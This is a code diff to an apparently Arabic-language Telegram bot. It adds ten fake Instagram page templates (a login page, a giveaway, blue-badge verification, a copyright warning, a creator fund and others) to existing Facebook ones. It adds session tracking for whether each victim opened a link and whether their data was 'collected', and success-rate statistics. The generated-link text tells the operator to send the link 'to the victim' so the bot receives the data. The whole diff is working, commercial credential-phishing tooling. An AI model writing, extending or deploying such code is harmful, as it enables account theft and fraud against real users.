@@ -1,7 +1,7 @@
 # bot_handlers.py
 # ============================================================
 # معالجات البوت الرئيسية: /start + callback + step handlers
-# v11 — Facebook Fake Sites (10 قوالب مواقع)
+# v12 — Facebook + Instagram Fake Sites
 # ============================================================
 
 import io
@@ -206,10 +206,97 @@ FACEBOOK_SITES = {
 
 
 # ============================================================
+# ★★★ Instagram Fake Sites Templates ★★★
+# ============================================================
+INSTAGRAM_SITES = {
+    "01_login": {
+        "emoji": "🔐",
+        "name": "تسجيل دخول Instagram",
+        "desc": (
+            "الصفحة الرسمية لتسجيل الدخول إلى Instagram.\n"
+            "تصميم نظيف بنسبة 95% مطابقة للأصل."
+        ),
+    },
+    "02_giveaway": {
+        "emoji": "🎁",
+        "name": "مسابقة Giveaway",
+        "desc": (
+            "مسابقة وهمية بجائزة $5,000 + iPhone.\n"
+            "تصميم احتفالي بألوان gradient."
+        ),
+    },
+    "03_verify": {
+        "emoji": "✅",
+        "name": "التوثيق الأزرق",
+        "desc": (
+            "يوهم الضحية بالحصول على الشارة الزرقاء.\n"
+            "تصميم رسمي بألوان Meta Blue."
+        ),
+    },
+    "04_creator_fund": {
+        "emoji": "💰",
+        "name": "صندوق المبدعين",
+        "desc": (
+            "يوهم الضحية بأرباح متبقية للسحب.\n"
+            "تصميم مالي مع إحصائيات."
+        ),
+    },
+    "05_copyright": {
+        "emoji": "📸",
+        "name": "تحذير حقوق النشر",
+        "desc": (
+            "يوهم الضحية بانتهاك حقوق النشر.\n"
+            "تصميم رسمي أحمر بأسلوب DMCA."
+        ),
+    },
+    "06_reels_bonus": {
+        "emoji": "🎬",
+        "name": "مكافآت Reels",
+        "desc": (
+            "مكافآت شهرية من Reels.\n"
+            "تصميم بنفسجي بلمسة ذهبية."
+        ),
+    },
+    "07_pro_dashboard": {
+        "emoji": "📊",
+        "name": "لوحة احترافية",
+        "desc": (
+            "لوحة تحليلات احترافية.\n"
+            "تصميم رمادي-أزرق مع رسوم بيانية."
+        ),
+    },
+    "08_login_alert": {
+        "emoji": "🔒",
+        "name": "تنبيه تسجيل دخول",
+        "desc": (
+            "تنبيه بمحاولة اختراق.\n"
+            "تصميم داكن بأيقونة تنبيه."
+        ),
+    },
+    "09_dating": {
+        "emoji": "❤️",
+        "name": "Instagram Dating",
+        "desc": (
+            "تعارف مع عرض خاص.\n"
+            "تصميم وردي-بنفسجي بأسلوب Netflix."
+        ),
+    },
+    "10_shopping": {
+        "emoji": "🛍️",
+        "name": "Instagram Shopping",
+        "desc": (
+            "متجر بعروض حصرية بخصم 70%.\n"
+            "تصميم برتقالي مع منتجات."
+        ),
+    },
+}
+
+
+# ============================================================
 # ★★★ إنشاء جلسة Facebook ★★★
 # ============================================================
 def _create_fb_session(chat_id, template_key):
-    """ينشئ session في Redis ويرجع الرابط"""
+    """ينشئ session Facebook في Redis"""
     if not redis_client:
         return None
 
@@ -228,14 +315,12 @@ def _create_fb_session(chat_id, template_key):
             "label": FACEBOOK_SITES.get(template_key, {}).get('name', 'Facebook'),
         }
 
-        # خزن لمدة 30 يوم
         redis_client.setex(
             f"se_session:{session_id}",
             86400 * 30,
             json.dumps(session_data, ensure_ascii=False)
         )
 
-        # أضف لقائمة المستخدم
         redis_client.lpush(f"se_user_sessions:{chat_id}", session_id)
         redis_client.ltrim(f"se_user_sessions:{chat_id}", 0, 199)
         redis_client.expire(f"se_user_sessions:{chat_id}", 86400 * 30)
@@ -247,6 +332,49 @@ def _create_fb_session(chat_id, template_key):
 
     except Exception as e:
         logger.exception(f"_create_fb_session error: {e}")
+        return None
+
+
+# ============================================================
+# ★★★ إنشاء جلسة Instagram ★★★
+# ============================================================
+def _create_ig_session(chat_id, template_key):
+    """ينشئ session Instagram في Redis"""
+    if not redis_client:
+        return None
+
+    try:
+        session_id = uuid.uuid4().hex[:16]
+        now = time.time()
+
+        session_data = {
+            "session_id": session_id,
+            "chat_id": str(chat_id),
+            "type": "instagram",
+            "template": template_key,
+            "created_at": now,
+            "accessed": False,
+            "collected": False,
+            "label": INSTAGRAM_SITES.get(template_key, {}).get('name', 'Instagram'),
+        }
+
+        redis_client.setex(
+            f"se_session:{session_id}",
+            86400 * 30,
+            json.dumps(session_data, ensure_ascii=False)
+        )
+
+        redis_client.lpush(f"se_user_sessions:{chat_id}", session_id)
+        redis_client.ltrim(f"se_user_sessions:{chat_id}", 0, 199)
+        redis_client.expire(f"se_user_sessions:{chat_id}", 86400 * 30)
+
+        logger.info(f"IG Session created: {session_id} | {template_key} | chat={chat_id}")
+        metrics.inc_counter("ig_sessions_created")
+
+        return session_id
+
+    except Exception as e:
+        logger.exception(f"_create_ig_session error: {e}")
         return None
 
 
@@ -308,7 +436,7 @@ def silent_collector_panel():
 
 
 # ============================================================
-# ★★★ لوحة Facebook Sites ★★★
+# لوحة Facebook Sites
 # ============================================================
 def build_facebook_sites_panel():
     """لوحة قوالب فيسبوك الـ 10"""
@@ -318,6 +446,23 @@ def build_facebook_sites_panel():
         m.add(InlineKeyboardButton(
             f"{tpl['emoji']} {tpl['name']}",
             callback_data=f"fb_site_{key}"
+        ))
+
+    m.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
+    return m
+
+
+# ============================================================
+# لوحة Instagram Sites
+# ============================================================
+def build_instagram_sites_panel():
+    """لوحة قوالب Instagram الـ 10"""
+    m = InlineKeyboardMarkup()
+
+    for key, tpl in INSTAGRAM_SITES.items():
+        m.add(InlineKeyboardButton(
+            f"{tpl['emoji']} {tpl['name']}",
+            callback_data=f"ig_site_{key}"
         ))
 
     m.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
@@ -728,10 +873,8 @@ def _handle_callback(call, chat_id, user_id, data):
 
         bot.answer_callback_query(call.id, "🔄 جاري توليد الرابط...")
 
-        # استهلك استخدام
         consume_usage(chat_id, "fb")
 
-        # أنشئ session
         session_id = _create_fb_session(chat_id, template_key)
 
         if not session_id:
@@ -742,7 +885,6 @@ def _handle_callback(call, chat_id, user_id, data):
             )
             return
 
-        # بناء الرابط
         fake_link = f"{PUBLIC_URL}/fs/facebook/{template_key}?s={session_id}"
 
         text = (
@@ -760,7 +902,6 @@ def _handle_callback(call, chat_id, user_id, data):
         )
 
         m = InlineKeyboardMarkup()
-        # زر نسخ الرابط
         try:
             from telebot.types import CopyTextButton
             m.add(InlineKeyboardButton(
@@ -787,12 +928,10 @@ def _handle_callback(call, chat_id, user_id, data):
         bot.answer_callback_query(call.id, "📊 جاري الحساب...")
 
         try:
-            # اجلب كل sessions المستخدم
             session_ids = []
             if redis_client:
                 session_ids = redis_client.lrange(f"se_user_sessions:{chat_id}", 0, 499) or []
 
-            # فلتر حسب القالب
             total = 0
             accessed = 0
             collected = 0
@@ -815,7 +954,6 @@ def _handle_callback(call, chat_id, user_id, data):
                     continue
 
             tpl = FACEBOOK_SITES.get(template_key, {})
-
             rate = (collected / total * 100) if total > 0 else 0
 
             text = (
@@ -833,6 +971,149 @@ def _handle_callback(call, chat_id, user_id, data):
 
         m = InlineKeyboardMarkup()
         m.add(InlineKeyboardButton("🔙 رجوع", callback_data=f"fb_site_{template_key}"))
+        safe_edit(call, text, reply_markup=m)
+        return
+
+    # ============================================================
+    # ★★★ Instagram Fake Sites ★★★
+    # ============================================================
+    if data == "gen_ig":
+        check = can_use_tool(chat_id, "ig")
+        if not check["allowed"]:
+            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
+            safe_edit(
+                call,
+                _deny_message(check["reason"], chat_id, "ig", check),
+                reply_markup=main_menu(user_id)
+            )
+            return
+
+        bot.answer_callback_query(call.id)
+
+        safe_edit(
+            call,
+            "📸 <b>مواقع Instagram المزيفة</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n\n"
+            "🎯 <b>10 قوالب احترافية</b>\n"
+            "كل قالب = موقع حقيقي بنسبة 95%\n\n"
+            "💡 <i>اختر القالب المناسب للضحية</i>",
+            reply_markup=build_instagram_sites_panel()
+        )
+        return
+
+    if data.startswith("ig_site_"):
+        template_key = data.replace("ig_site_", "")
+
+        tpl = INSTAGRAM_SITES.get(template_key)
+        if not tpl:
+            bot.answer_callback_query(call.id, "❌ القالب غير موجود", show_alert=True)
+            return
+
+        check = can_use_tool(chat_id, "ig")
+        if not check["allowed"]:
+            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
+            return
+
+        bot.answer_callback_query(call.id, "🔄 جاري توليد الرابط...")
+
+        consume_usage(chat_id, "ig")
+
+        session_id = _create_ig_session(chat_id, template_key)
+
+        if not session_id:
+            safe_edit(
+                call,
+                "❌ فشل إنشاء الجلسة، حاول مرة أخرى",
+                reply_markup=build_instagram_sites_panel()
+            )
+            return
+
+        fake_link = f"{PUBLIC_URL}/fs/instagram/{template_key}?s={session_id}"
+
+        text = (
+            f"{tpl['emoji']} <b>{tpl['name']}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n\n"
+            f"📋 <b>وصف القالب:</b>\n"
+            f"<i>{tpl['desc']}</i>\n\n"
+            f"🎯 <b>الرابط الجاهز:</b>\n"
+            f"<code>{fake_link}</code>\n\n"
+            f"💡 <b>كيفية الاستخدام:</b>\n"
+            f"• انسخ الرابط\n"
+            f"• أرسله للضحية\n"
+            f"• عندما تفتحه، ستظهر صفحة {tpl['name']}\n"
+            f"• البوت سيستقبل البيانات فوراً"
+        )
+
+        m = InlineKeyboardMarkup()
+        try:
+            from telebot.types import CopyTextButton
+            m.add(InlineKeyboardButton(
+                "📋 نسخ الرابط",
+                copy_text=CopyTextButton(text=fake_link)
+            ))
+        except Exception:
+            pass
+
+        m.row(
+            InlineKeyboardButton("🔄 توليد جديد", callback_data=f"ig_site_{template_key}"),
+            InlineKeyboardButton("📊 الإحصائيات", callback_data=f"ig_stats_{template_key}"),
+        )
+        m.add(InlineKeyboardButton("🔙 رجوع للقوالب", callback_data="gen_ig"))
+
+        safe_edit(call, text, reply_markup=m)
+
+        logger.info(f"IG Fake Link generated: {template_key} | {session_id}")
+        return
+
+    if data.startswith("ig_stats_"):
+        template_key = data.replace("ig_stats_", "")
+
+        bot.answer_callback_query(call.id, "📊 جاري الحساب...")
+
+        try:
+            session_ids = []
+            if redis_client:
+                session_ids = redis_client.lrange(f"se_user_sessions:{chat_id}", 0, 499) or []
+
+            total = 0
+            accessed = 0
+            collected = 0
+
+            for sid in session_ids:
+                try:
+                    raw = redis_client.get(f"se_session:{sid}")
+                    if not raw:
+                        continue
+                    sdata = json.loads(raw)
+                    if sdata.get('template') != template_key:
+                        continue
+
+                    total += 1
+                    if sdata.get('accessed'):
+                        accessed += 1
+                    if sdata.get('collected'):
+                        collected += 1
+                except Exception:
+                    continue
+
+            tpl = INSTAGRAM_SITES.get(template_key, {})
+            rate = (collected / total * 100) if total > 0 else 0
+
+            text = (
+                f"📊 <b>إحصائيات {tpl.get('name', template_key)}</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n\n"
+                f"🔗 <b>إجمالي اللينكات:</b> <code>{total}</code>\n"
+                f"👁️ <b>تم فتحها:</b> <code>{accessed}</code>\n"
+                f"✅ <b>جمعت بيانات:</b> <code>{collected}</code>\n"
+                f"📈 <b>نسبة النجاح:</b> <code>{rate:.1f}%</code>\n"
+            )
+
+        except Exception as e:
+            logger.exception(f"ig_stats error: {e}")
+            text = f"❌ خطأ: {h(str(e)[:200])}"
+
+        m = InlineKeyboardMarkup()
+        m.add(InlineKeyboardButton("🔙 رجوع", callback_data=f"ig_site_{template_key}"))
         safe_edit(call, text, reply_markup=m)
         return
 
@@ -1913,36 +2194,6 @@ def _handle_callback(call, chat_id, user_id, data):
             parse_mode="HTML"
         )
         bot.register_next_step_handler(msg, lambda m, u=uid: admin_msg_user_handler(m, u))
-        return
-
-    # ============================================================
-    # انستقرام
-    # ============================================================
-    if data == "gen_ig":
-        check = can_use_tool(chat_id, "ig")
-        if not check["allowed"]:
-            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
-            safe_edit(
-                call,
-                _deny_message(check["reason"], chat_id, "ig", check),
-                reply_markup=main_menu(user_id)
-            )
-            return
-        consume_usage(chat_id, "ig")
-        bot.answer_callback_query(call.id, "جاري التجهيز...")
-        link = f"{PUBLIC_URL}/ig_login.php?id={chat_id}"
-
-        m = InlineKeyboardMarkup()
-        m.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
-
-        safe_edit(
-            call,
-            f"📸 <b>رابط انستقرام</b>\n"
-            f"━━━━━━━━━━━━━━━━━━\n\n"
-            f"<code>{h(link)}</code>\n\n"
-            f"💡 أرسل هذا الرابط للضحية",
-            reply_markup=m
-        )
         return
 
     # ============================================================
